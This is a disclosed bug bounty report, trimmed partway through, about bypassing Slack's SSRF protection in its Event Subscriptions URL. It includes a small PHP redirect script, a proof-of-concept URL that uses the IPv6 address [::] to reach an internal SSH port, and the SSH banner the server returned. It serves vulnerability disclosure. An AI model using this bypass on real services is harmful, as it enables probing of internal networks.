# [M] Bypass of the SSRF protection in Event Subscriptions parameter.

## Summary
Severity: Medium
Program: Slack
Weakness: Server-Side Request Forgery (SSRF)
Reporter: elber
State: resolved
Disclosed: 2019-02-22T20:58:48.514Z
Source: https://hackerone.com/reports/386292

## Details
The vulnerability is present in the "Event Subscriptions" parameter where:
"`Your app can subscribe to be notified of events in Slack (for example, when a user adds a reaction or creates a file) at a URL you choose.` ".
URL:
`https://api.slack.com/apps/YOUAPPCODE/event-subscriptions?`

When we add a site that does not meet API standards, we receive the following message:
{F323999}

`Your request URL gave us a 500 error. Update your URL to receive a new request and challenge value.`

After testing several SSRF techniques I found a bypass for this protection.
Using an IPV6 vector `[::]`.

On my host,  `x.php` has:

```
<?php
header("location: ".$_GET['u']);
?>
```
PoC:

http://hacker.site/x.php/?u=http://[::]:22/

Response:
SSH [::]:22

{F324002}

```
"body": {
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
Protocol mismatch.
 
}
```

SMNTP [::]:25

_Trimmed to 38 lines — full report: https://hackerone.com/reports/386292_
